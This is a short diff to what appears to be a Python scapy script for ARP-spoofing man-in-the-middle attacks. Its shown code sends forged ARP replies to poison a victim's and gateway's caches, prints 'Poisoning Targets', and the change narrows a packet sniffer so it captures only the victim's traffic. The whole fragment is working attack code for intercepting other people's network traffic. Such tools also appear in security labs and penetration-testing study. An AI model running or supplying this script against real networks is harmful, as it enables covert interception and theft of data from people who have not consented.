@@ -38,9 +38,9 @@ def trick(gm, vm):
 	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
 	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))
 
-def dosniff(interface):
+def dosniff(interface,victimIP):
     while True:
-        capture = sniff(iface=interface,count=1)
+        capture = sniff(filter=f"host {victimIP}",iface=interface,count=1)
         capture.summary()
 
 def mitm():
@@ -59,7 +59,7 @@ def mitm():
 		print("[!] Exiting...")
 		sys.exit(1)
 	print("[*] Poisoning Targets...")
-	t = threading.Thread(target = dosniff, args = (interface,))
+	t = threading.Thread(target = dosniff, args = (interface,victimIP))
 	t.start()
 	print("[*] sniffing")
 	while 1:
